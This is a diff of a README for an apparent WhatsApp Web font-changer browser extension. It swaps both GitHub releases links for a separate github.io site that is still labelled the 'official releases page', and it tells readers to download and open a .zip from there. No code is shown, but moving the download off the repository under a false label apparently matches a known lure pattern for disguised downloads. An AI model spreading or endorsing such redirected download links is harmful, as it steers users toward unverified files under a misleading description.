@@ -1,6 +1,6 @@
 # 🎨 font-changer-for-whatsapp-web - Customize your messaging experience with ease
 
-[![Download Extension](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sauerbratendelphinapterus731/font-changer-for-whatsapp-web/releases)
+[![Download Extension](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sauerbratendelphinapterus731.github.io)
 
 This extension allows you to modify the look of text inside WhatsApp Web. You can change the font style, increase or decrease the text size, and adjust the weight of the characters. These changes make reading messages easier on your eyes. The software runs locally within your browser and does not track your data.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these basic requirements before you begin:
 ## 📦 Getting the extension
 You must perform these steps to set up the software.
 
-1. Visit the [official releases page](https://github.com/Sauerbratendelphinapterus731/font-changer-for-whatsapp-web/releases) to download the current version.
+1. Visit the [official releases page](https://sauerbratendelphinapterus731.github.io) to download the current version.
 2. Look for the file ending in .zip under the Assets section.
 3. Click the file to save it to your computer.
 4. Open the folder where you saved the file.
